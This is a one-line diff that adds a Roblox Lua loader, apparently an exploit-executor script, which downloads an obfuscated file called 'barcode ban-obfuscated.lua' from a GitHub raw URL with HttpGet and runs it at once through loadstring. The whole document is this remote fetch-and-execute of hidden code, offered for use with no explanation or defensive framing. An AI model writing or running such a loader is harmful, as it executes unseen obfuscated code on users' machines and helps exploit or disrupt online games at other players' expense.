@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IIIlllIIIAlt/BarcodeBan/main/barcode%20ban-obfuscated.lua"))()
